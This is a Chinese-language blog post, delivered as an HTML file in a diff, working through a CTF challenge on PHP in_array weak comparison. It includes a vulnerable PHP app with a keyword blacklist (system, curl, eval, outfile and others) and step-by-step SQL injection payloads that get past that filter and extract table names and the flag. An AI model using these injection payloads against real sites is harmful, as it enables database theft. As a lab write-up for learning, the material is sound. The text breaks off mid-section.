@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>Type Juggling in PHP-上 | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Type Juggling in PHP-上</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">June 7, 2020&nbsp;&nbsp;23:11:25</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>这几天稍微有点休息时间，所以学习了下红日安全小组的代码审计项目，Day1的审计就是探究<code>in_array</code>函数在使用时可能存在的安全缺陷，然后我就想到了对php的弱类型比较做一个比较系统的学习，顺便把学到的知识记录下来。</p>
+<p>这一部分的知识比较多，一篇文章写不完，所以打算两部分或者三部分来完成。</p>
+<h2 id="1-in-array"><a href="#1-in-array" class="headerlink" title="1. in_array()"></a>1. in_array()</h2><p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/21.png" alt="21"></p>
+<p>在<code>in_array()</code>函数中，只有在第三个参数被设置为<code>true</code>时才会对给定的值在数组中进行强类型比较搜索。而有些时候开发者可能会直接忘记将第三个参数值设置为<code>true</code>而导致漏洞产生。</p>
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/22.png" alt="22"></p>
+<p>上面是一个简单的例子，在第三个参数没有被设置为<code>true</code>时，进行就是弱类型比较，字符串<code>1aaa</code>会被数字1匹配到。</p>
+<h3 id="1-1-题目"><a href="#1-1-题目" class="headerlink" title="1.1 题目"></a>1.1 题目</h3><p>下面是一道ctf题</p>
+<p><strong>index.php</strong> :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT COUNT(*) FROM users"</span>;</span><br><span class="line">$whitelist = <span class="keyword">array</span>();</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    $whitelist = range(<span class="number">1</span>, $row[<span class="string">'COUNT(*)'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = stop_hack($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE id=$id"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array($id, $whitelist)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"id $id is not in whitelist."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;table border='1'&gt;"</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($row <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/table&gt;&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>($conn-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>config.php</strong> :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"root"</span>;</span><br><span class="line">$password = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"day1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stop_hack</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">    $pattern = <span class="string">"insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval"</span>;</span><br><span class="line">    $back_list = explode(<span class="string">"|"</span>,$pattern);</span><br><span class="line">    <span class="keyword">foreach</span>($back_list <span class="keyword">as</span> $hack)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/$hack/i"</span>, $value))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"$hack detected!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>sql</strong> :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 搭建CTF环境使用的sql语句</span><br><span class="line">create database day1;</span><br><span class="line">use day1;</span><br><span class="line">create table users (</span><br><span class="line">id int(6) unsigned auto_increment primary key,</span><br><span class="line">name varchar(20) not null,</span><br><span class="line">email varchar(30) not null,</span><br><span class="line">salary int(8) unsigned not null );</span><br><span class="line"></span><br><span class="line">INSERT INTO users VALUES(1,&#39;Lucia&#39;,&#39;Lucia@hongri.com&#39;,3000);</span><br><span class="line">INSERT INTO users VALUES(2,&#39;Danny&#39;,&#39;Danny@hongri.com&#39;,4500);</span><br><span class="line">INSERT INTO users VALUES(3,&#39;Alina&#39;,&#39;Alina@hongri.com&#39;,2700);</span><br><span class="line">INSERT INTO users VALUES(4,&#39;Jameson&#39;,&#39;Jameson@hongri.com&#39;,10000);</span><br><span class="line">INSERT INTO users VALUES(5,&#39;Allie&#39;,&#39;Allie@hongri.com&#39;,6000);</span><br><span class="line"></span><br><span class="line">create table flag(flag varchar(30) not null);</span><br><span class="line">INSERT INTO flag VALUES(&#39;HRCTF&#123;1n0rrY_i3_Vu1n3rab13&#125;&#39;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-漏洞分析"><a href="#1-2-漏洞分析" class="headerlink" title="1.2 漏洞分析"></a>1.2 漏洞分析</h3><p>这道题的漏洞成因很简单，就是检查用户可控的参数<code>id</code>是不是在<code>$whitelist</code>内，<code>$whitelist</code>就是数据库中的记录对应的条数，比如数据库中有5条记录，那<code>$whitelist</code>就是<code>[1,2,3,4,5]</code>。</p>
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/23.png" alt="23"></p>
+<p>然后<code>in_array</code>函数的第三个参数没有被设置为<code>true</code>，所以导致了弱类型比较，造成了漏洞。</p>
+<h3 id="1-3-题解"><a href="#1-3-题解" class="headerlink" title="1.3 题解"></a>1.3 题解</h3><h4 id="1-3-1-第一层：过滤了concat-函数"><a href="#1-3-1-第一层：过滤了concat-函数" class="headerlink" title="1.3.1 第一层：过滤了concat()函数"></a>1.3.1 第一层：过滤了concat()函数</h4><p><code>stop_hack()</code>函数过滤掉了很多东西，首先注意到的是它过滤了<code>concat</code>函数，所以要找到<code>concat</code>函数的替代函数。</p>
+<p>一个可行的替代函数是<code>make_set</code>。</p>
+<p>语法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make_set(bits, str1, str2, ...)</span><br></pre></td></tr></table></figure>
+
+<p><code>make_set</code>会返回一个设定值（包含分隔子字符串的分隔符<code>,</code>）在设置位的相应位的字符串，str1对应位0，str2对应位1，以此类推。</p>
+<p>看几个例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select make_set(1, &#39;aaa&#39;, &#39;bbb&#39;, &#39;ccc&#39;);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| make_set(1, &#39;aaa&#39;, &#39;bbb&#39;, &#39;ccc&#39;) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| aaa                              |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.03 sec)</span><br></pre></td></tr></table></figure>
+
+<p>这个例子返回的结果是<code>aaa</code>，将bits转化为二进制，<code>1</code>转换为二进制的结果是<code>0001</code>，第0位是<code>1</code>，所以第0位对应的str1，也就是<code>aaa</code>，会被输出。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select make_set(3, &#39;aaa&#39;, &#39;bbb&#39;, &#39;ccc&#39;);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| make_set(3, &#39;aaa&#39;, &#39;bbb&#39;, &#39;ccc&#39;) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| aaa,bbb                          |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>将bits位上的数字<code>3</code>转为二进制是<code>0011</code>，所以取第0位和第1位的字符串输出，这个返回的结果是<code>aaa,bbb</code>，两个字符串之间用<code>,</code>连接。</p>
+<p>用<code>make_set</code>替代<code>concat</code>爆数据库看下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 爆数据库</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;in_array&#x2F;index.php?id&#x3D;1 and updatexml(1,make_set(3,0x7e,(database())),1)%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/1.png" alt="1"></p>
+<h4 id="1-3-2-第二层：过滤了or"><a href="#1-3-2-第二层：过滤了or" class="headerlink" title="1.3.2 第二层：过滤了or"></a>1.3.2 第二层：过滤了or</h4><p>但是在爆数据表名的时候却发现了问题：<code>or detected</code>……</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 爆数据表</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;in_array&#x2F;index.php?id&#x3D;1 and updatexml(1,make_set(3,0x7e,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;database() limit 0,1)),1)%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/2.png" alt="2"></p>
+<p>在<code>stop_hack()</code>函数中过滤了<code>or</code>，而<code>information_schema</code>中包含<code>or</code>，所以也被waf掉了。</p>
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/3.png" alt="3"></p>
+<p>一般过滤掉<code>or</code>时，常见的绕过方法有：</p>
+<ol>
+<li>双写绕过，但这种一般适用于用<code>replace()</code>函数把<code>or</code>去掉的题目，这种题目一般都不会循环检查，所以双写<code>or</code>就可以绕过；</li>
+<li>大写<code>OR</code>绕过，有的题目只会匹配小写的<code>or</code>，但是不适用于本题，本题的正则是<code>/$hack/i</code>，<code>/i</code>表示大小写不敏感，所以大写的<code>OR</code>还是会被匹配到；</li>
+<li><code>||</code>绕过，但是这种适用于<code>or</code>关键字，对于<code>information_schema</code>中的<code>or</code>没用。</li>
+</ol>
+<p>现在看起来所有的方法都没用，一番苦搜之后，发现了两种替代方法，其中一种方法仅仅在Mysql版本5.7上适用。</p>
+<p><strong>information_schame数据库</strong></p>
+<p>我们首先要知道<code>information_schema</code>是什么，为什么爆数据表、爆字段的时候都需要用到这个库。</p>
+<p><code>information_schema</code>这个库是用来存储数据库元数据的，例如数据库名、数据表明、列名的数据类型、访问权限等。<code>information_schema</code>中的表实际上是视图，而不是基本表，所以文件系统上没有与之相关的文件。</p>
+<p><strong>TABLES表</strong></p>
+<p><code>information_schema</code>数据库中的<code>TABLES</code>数据表，就存储了mysql数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型，存储引擎、创建时间等信息。</p>
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/8.png" alt="8"></p>
+<p>所以我们都用<code>information_schema.TABLES</code>来获取数据表信息。</p>
+<p><strong>COLUMNS表</strong></p>
+<p>存储数据表中的列信息，包括表有多少个列，每个列的类型。</p>
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/9.png" alt="9"></p>
+<p>在sql注入时用<code>information_schema.COLUMNS</code>来获取字段信息。</p>
+<h5 id="innodb"><a href="#innodb" class="headerlink" title="innodb"></a>innodb</h5><p>要求：MySQL &gt; 5.6.x</p>
+<p>在MySQL中使用最广泛的两种引擎莫过于<code>InnoDB</code>和<code>MyISAM</code>。在MySQL5.5版本之前，<code>MyISAM</code>是MySQL关系数据库管理系统的默认存储引擎。在5.6版本的MySQL中，因为InnoDB引擎对支持事务，具有更高的并发性等优点开始被广泛的使用并取代<code>MyISAM</code>，在5.6版本中正式成为MySQL的默认引擎。</p>
+<p>从5.6.x版本开始，<code>InnoDB</code>新增了两个数据表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">innodb_index_stats</span><br><span class="line">innodb_table_stats</span><br></pre></td></tr></table></figure>
+
+<p>从官方的解释可以看到这两个表的效果一样，这两张表中都存储了我们需要的<code>database_name</code>和<code>table_name</code>。</p>
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/10.png" alt="10"></p>
+<p>用<code>mysql.innodb_table_stats</code>或是<code>mysql.innodb_index.stats</code>替代<code>information.schema</code>，可以得到payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 爆数据表</span><br><span class="line">http:&#x2F;&#x2F;192.168.247.131&#x2F;in_array&#x2F;index.php?id&#x3D;1 and updatexml(1,make_set(3,0x7e,(select table_name from mysql.innodb_table_stats where database_name&#x3D;database() limit 0,1)),1)%23</span><br></pre></td></tr></table></figure>
+
+<p>成功获得数据表信息：</p>
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/11.png" alt="11"></p>
+<p>但是问题马上来了，我们无法获得字段名，因为这两张表中不包含字段信息。</p>
+<p>对于字段名未知的字段可以用<code>union select</code>进行无列名注入，但是本题偏偏又过滤掉了<code>union</code>关键字（过滤真不少…），把<code>union</code>从黑名单中去除后来尝试一下。</p>
+<p>在介绍具体的方法之前先看一下具体的例子，有一个users表，其中有<code>id</code>，<code>name</code>，<code>email</code>和<code>salary</code>字段。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+---------+--------------------+--------+</span><br><span class="line">| id | name    | email              | salary |</span><br><span class="line">+----+---------+--------------------+--------+</span><br><span class="line">|  1 | Lucia   | Lucia@hongri.com   |   3000 |</span><br><span class="line">|  2 | Danny   | Danny@hongri.com   |   4500 |</span><br><span class="line">|  3 | Alina   | Alina@hongri.com   |   2700 |</span><br><span class="line">|  4 | Jameson | Jameson@hongri.com |  10000 |</span><br><span class="line">|  5 | Allie   | Allie@hongri.com   |   6000 |</span><br><span class="line">+----+---------+--------------------+--------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>使用union进行联合查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3,4 union select * from users;</span><br><span class="line">+---+---------+--------------------+-------+</span><br><span class="line">| 1 | 2       | 3                  | 4     |</span><br><span class="line">+---+---------+--------------------+-------+</span><br><span class="line">| 1 | 2       | 3                  |     4 |</span><br><span class="line">| 1 | Lucia   | Lucia@hongri.com   |  3000 |</span><br><span class="line">| 2 | Danny   | Danny@hongri.com   |  4500 |</span><br><span class="line">| 3 | Alina   | Alina@hongri.com   |  2700 |</span><br><span class="line">| 4 | Jameson | Jameson@hongri.com | 10000 |</span><br><span class="line">| 5 | Allie   | Allie@hongri.com   |  6000 |</span><br><span class="line">+---+---------+--------------------+-------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>接着就可以使用数字来获取对应的列名，如第3列就对应了users表中的<code>email</code>字段。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &#96;3&#96; from (select 1,2,3,4 union select * from users)f;</span><br><span class="line">+--------------------+</span><br><span class="line">| 3                  |</span><br><span class="line">+--------------------+</span><br><span class="line">| 3                  |</span><br><span class="line">| Lucia@hongri.com   |</span><br><span class="line">| Danny@hongri.com   |</span><br><span class="line">| Alina@hongri.com   |</span><br><span class="line">| Jameson@hongri.com |</span><br><span class="line">| Allie@hongri.com   |</span><br><span class="line">+--------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>然后加上<code>limit</code>我们就可以读取任意一行的信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &#96;3&#96; from (select 1,2,3,4 union select * from users)f limit 2,1;</span><br><span class="line">+------------------+</span><br><span class="line">| 3                |</span><br><span class="line">+------------------+</span><br><span class="line">| Danny@hongri.com |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>在 <strong>`</strong> 符号无法使用的时候，还可以用alias来替代：</p>
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/14.png" alt="14"></p>
+<p>而对于本题的<code>flag</code>数据表在前面一步已经通过<code>mysql.innodb_index_stats</code>获得了，再通过无列名注入的方式就可以获得数据信息：</p>
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/12.png" alt="12"></p>
+<p>最后生成的payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.247.131&#x2F;in_array&#x2F;index.php?id&#x3D;1 and updatexml(1,make_set(3,0x7e,(select &#96;1&#96; from (select 1 union select * from flag)red limit 1,1)),1)%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/13.png" alt="13"></p>
+<p>在没有过滤掉<code>union</code>和<code>*</code>的未知列名的情况下，可以用上面方式进行注入，但是本题禁掉了<code>union</code>和<code>*</code>，所以这种方法也不是很好。第二种方法可以突破这个限制，但是MySQL的版本要求更高。</p>
+<h5 id="sys-schema-auto-increment-columns"><a href="#sys-schema-auto-increment-columns" class="headerlink" title="sys.schema_auto_increment_columns"></a><strong>sys.schema_auto_increment_columns</strong></h5><p>要求：MySQL &gt;= 5.7</p>
+<p>MySQL 5.7中引入了一个新的sys schema，sys是要给MySQL自带的系统库，在安装MySQL 5.7以后的版本，使用mysqld进行初始化时，会自动创建sys库。sys库里的表，视图，函数可以使我们更方便、更快捷的了解到MySQL的一些信息。sys库里的视图数据，大多是从<code>performance_schema</code>里面获得的，目标是降低performance_schema`的复杂度，让用户能更快的了解DB的运行情况。（来自 <a href="https://www.cnblogs.com/kunjian/p/11653853.html" target="_blank" rel="noopener">https://www.cnblogs.com/kunjian/p/11653853.html</a> ）</p>
+<p>根据官方文档，<code>sys.schema_auto_increment_columns</code>视图中存储了哪些表具有<code>auto_increment</code>列（自增列），并提供有关这些列的信息。</p>
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/15.png" alt="15"></p>
+<p>从上图可以看到，从<code>sys.schema_auto_increment_columns</code>视图中可以看到哪些数据库（table_schema）中的哪个数据表（table_name）中的哪个<code>column_name</code>具有自增性质。</p>
+<p>对应的查询语句为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select TABLE_NAME from sys.schema_auto_increment_columns where table_schema&#x3D;database();</span><br></pre></td></tr></table></figure>
+
+<p>在本地测试的结果：</p>
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/16.png" alt="16"></p>
+<p>对应本题有payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 爆数据表</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;in_array&#x2F;index.php?id&#x3D;1 and updatexml(1,make_set(3,0x7e,(select TABLE_NAME from sys.schema_auto_increment_columns where table_schema&#x3D;database() limit 1,1)),1)%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/17.png" alt="17"></p>
+<p>获得<code>users</code>表，但是当将<code>limit 0,1</code>换成<code>limit 1,1</code>来查询下一张表的时候却发现没有成功：</p>
+<p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/18.png" alt="18"></p>
+<p>这是因为<code>flag</code>表中没有自增的字段，所以自然的，<code>sys.schema_auto_increment_columns</code>中不会有<code>flag</code>表的信息，所以在做sql注入题时，用<code>sys.schema_auto_increment_columns</code>其实是比较冒险的，因为你根本就不知道你需要的表中是否有自增字段。</p>
+<h5 id="schema-table-statistics-with-buffer-and-x-schema-table-statistics-with-buffer"><a href="#schema-table-statistics-with-buffer-and-x-schema-table-statistics-with-buffer" class="headerlink" title="schema_table_statistics_with_buffer and x$schema_table_statistics_with_buffer"></a>schema_table_statistics_with_buffer and x$schema_table_statistics_with_buffer</h5><p><img src="/2020/06/07/Type-Juggling-in-PHP-%E4%B8%8A/imgs/19.png" alt="19"></p>
+<p>在视图<code>schema_table_statistics_with_buffer</code>中看到了<code>flag</code>表信息。</p>
+<p>payload：</p>
